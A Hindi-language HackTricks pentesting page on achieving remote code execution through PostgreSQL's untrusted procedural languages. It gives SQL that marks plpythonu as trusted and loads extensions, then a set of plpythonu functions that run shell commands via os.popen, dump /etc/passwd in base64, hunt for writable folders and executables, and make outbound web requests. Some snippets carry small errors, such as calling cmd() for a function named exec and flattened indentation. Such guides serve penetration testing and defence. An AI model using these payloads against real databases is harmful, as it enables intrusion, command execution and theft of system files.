# RCE with PostgreSQL Languages

{{#include ../../../banners/hacktricks-training.md}}

## PostgreSQL Languages

आपके पास जो PostgreSQL डेटाबेस है, उसमें विभिन्न **स्क्रिप्टिंग भाषाएँ स्थापित** हो सकती हैं जिन्हें आप **मनमाने कोड** को **निष्पादित** करने के लिए दुरुपयोग कर सकते हैं।

आप उन्हें **चलाने** के लिए:
```sql
\dL *

SELECT lanname,lanpltrusted,lanacl FROM pg_language;
```
PostgreSQL में आप जो अधिकांश स्क्रिप्टिंग भाषाएँ स्थापित कर सकते हैं, उनके **2 प्रकार** होते हैं: **trusted** और **untrusted**। **untrusted** का नाम **"u"** पर समाप्त होगा और यह वह संस्करण होगा जो आपको **कोड निष्पादित** करने और अन्य दिलचस्प कार्यों का उपयोग करने की अनुमति देगा। ये भाषाएँ हैं जो यदि स्थापित हैं तो दिलचस्प हैं:

- **plpythonu**
- **plpython3u**
- **plperlu**
- **pljavaU**
- **plrubyu**
- ... (कोई अन्य प्रोग्रामिंग भाषा जो असुरक्षित संस्करण का उपयोग कर रही है)

> [!WARNING]
> यदि आप पाते हैं कि एक दिलचस्प भाषा **स्थापित** है लेकिन PostgreSQL द्वारा **untrusted** है (**`lanpltrusted`** **`false`** है) तो आप इसे **trust** करने की कोशिश कर सकते हैं ताकि PostgreSQL द्वारा कोई प्रतिबंध लागू न हो:
>
> ```sql
> UPDATE pg_language SET lanpltrusted=true WHERE lanname='plpythonu';
> # pg_language तालिका पर अपने अनुमतियों की जांच करने के लिए
> SELECT * FROM information_schema.table_privileges WHERE table_name = 'pg_language';
> ```

> [!CAUTION]
> यदि आप एक भाषा नहीं देखते हैं, तो आप इसे लोड करने की कोशिश कर सकते हैं (**आपको सुपरएडमिन होना चाहिए**):
>
> ```
> CREATE EXTENSION plpythonu;
> CREATE EXTENSION plpython3u;
> CREATE EXTENSION plperlu;
> CREATE EXTENSION pljavaU;
> CREATE EXTENSION plrubyu;
> ```

ध्यान दें कि सुरक्षित संस्करणों को "unsecure" के रूप में संकलित करना संभव है। उदाहरण के लिए [**यह**](https://www.robbyonrails.com/articles/2005/08/22/installing-untrusted-pl-ruby-for-postgresql.html) देखें। इसलिए यह हमेशा कोशिश करने लायक है कि क्या आप कोड निष्पादित कर सकते हैं, भले ही आप केवल **trusted** वाला ही स्थापित पाएँ।

## plpythonu/plpython3u

{{#tabs}}
{{#tab name="RCE"}}
```sql
CREATE OR REPLACE FUNCTION exec (cmd text)
RETURNS VARCHAR(65535) stable
AS $$
import os
return os.popen(cmd).read()
#return os.execve(cmd, ["/usr/lib64/pgsql92/bin/psql"], {})
$$
LANGUAGE 'plpythonu';

SELECT cmd("ls"); #RCE with popen or execve
```
{{#endtab}}

{{#tab name="Get OS user"}}
```sql
CREATE OR REPLACE FUNCTION get_user (pkg text)
RETURNS VARCHAR(65535) stable
AS $$
import os
return os.getlogin()
$$
LANGUAGE 'plpythonu';

SELECT get_user(""); #Get user, para is useless
```
{{#endtab}}

{{#tab name="List dir"}}
```sql
CREATE OR REPLACE FUNCTION lsdir (dir text)
RETURNS VARCHAR(65535) stable
AS $$
import json
from os import walk
files = next(walk(dir), (None, None, []))
return json.dumps({"root": files[0], "dirs": files[1], "files": files[2]})[:65535]
$$
LANGUAGE 'plpythonu';

SELECT lsdir("/"); #List dir
```
{{#endtab}}

{{#tab name="W फ़ोल्डर खोजें"}}
```sql
CREATE OR REPLACE FUNCTION findw (dir text)
RETURNS VARCHAR(65535) stable
AS $$
import os
def my_find(path):
writables = []
def find_writable(path):
if not os.path.isdir(path):
return
if os.access(path, os.W_OK):
writables.append(path)
if not os.listdir(path):
return
else:
for item in os.listdir(path):
find_writable(os.path.join(path, item))
find_writable(path)
return writables

return ", ".join(my_find(dir))
$$
LANGUAGE 'plpythonu';

SELECT findw("/"); #Find Writable folders from a folder (recursively)
```
{{#endtab}}

{{#tab name="फाइल खोजें"}}
```sql
CREATE OR REPLACE FUNCTION find_file (exe_sea text)
RETURNS VARCHAR(65535) stable
AS $$
import os
def my_find(path):
executables = []
def find_executables(path):
if not os.path.isdir(path):
executables.append(path)

if os.path.isdir(path):
if not os.listdir(path):
return
else:
for item in os.listdir(path):
find_executables(os.path.join(path, item))
find_executables(path)
return executables

a = my_find("/")
b = []

for i in a:
if exe_sea in os.path.basename(i):
b.append(i)
return ", ".join(b)
$$
LANGUAGE 'plpythonu';

SELECT find_file("psql"); #Find a file
```
{{#endtab}}

{{#tab name="Executable खोजें"}}
```sql
CREATE OR REPLACE FUNCTION findx (dir text)
RETURNS VARCHAR(65535) stable
AS $$
import os
def my_find(path):
executables = []
def find_executables(path):
if not os.path.isdir(path) and os.access(path, os.X_OK):
executables.append(path)

if os.path.isdir(path):
if not os.listdir(path):
return
else:
for item in os.listdir(path):
find_executables(os.path.join(path, item))
find_executables(path)
return executables

a = my_find(dir)
b = []

for i in a:
b.append(os.path.basename(i))
return ", ".join(b)
$$
LANGUAGE 'plpythonu';

SELECT findx("/"); #Find an executables in folder (recursively)
```
{{#endtab}}

{{#tab name="Find exec by subs"}}
```sql
CREATE OR REPLACE FUNCTION find_exe (exe_sea text)
RETURNS VARCHAR(65535) stable
AS $$
import os
def my_find(path):
executables = []
def find_executables(path):
if not os.path.isdir(path) and os.access(path, os.X_OK):
executables.append(path)

if os.path.isdir(path):
if not os.listdir(path):
return
else:
for item in os.listdir(path):
find_executables(os.path.join(path, item))
find_executables(path)
return executables

a = my_find("/")
b = []

for i in a:
if exe_sea in i:
b.append(i)
return ", ".join(b)
$$
LANGUAGE 'plpythonu';

SELECT find_exe("psql"); #Find executable by susbstring
```
{{#endtab}}

{{#tab name="Read"}}
```sql
CREATE OR REPLACE FUNCTION read (path text)
RETURNS VARCHAR(65535) stable
AS $$
import base64
encoded_string= base64.b64encode(open(path).read())
return encoded_string.decode('utf-8')
return open(path).read()
$$
LANGUAGE 'plpythonu';

select read('/etc/passwd'); #Read a file in b64
```
{{#endtab}}

{{#tab name="Get perms"}}
```sql
CREATE OR REPLACE FUNCTION get_perms (path text)
RETURNS VARCHAR(65535) stable
AS $$
import os
status = os.stat(path)
perms = oct(status.st_mode)[-3:]
return str(perms)
$$
LANGUAGE 'plpythonu';

select get_perms("/etc/passwd"); # Get perms of file
```
{{#endtab}}

{{#tab name="Request"}}
```sql
CREATE OR REPLACE FUNCTION req2 (url text)
RETURNS VARCHAR(65535) stable
AS $$
import urllib
r = urllib.urlopen(url)
return r.read()
$$
LANGUAGE 'plpythonu';

SELECT req2('https://google.com'); #Request using python2

CREATE OR REPLACE FUNCTION req3 (url text)
RETURNS VARCHAR(65535) stable
AS $$
from urllib import request
r = request.urlopen(url)
return r.read()
$$
LANGUAGE 'plpythonu';

SELECT req3('https://google.com'); #Request using python3
```
{{#endtab}}
{{#endtabs}}

## pgSQL

निम्नलिखित पृष्ठ की जांच करें:

{{#ref}}
pl-pgsql-password-bruteforce.md
{{#endref}}

## C

निम्नलिखित पृष्ठ की जांच करें:

{{#ref}}
rce-with-postgresql-extensions.md
{{#endref}}

{{#include ../../../banners/hacktricks-training.md}}
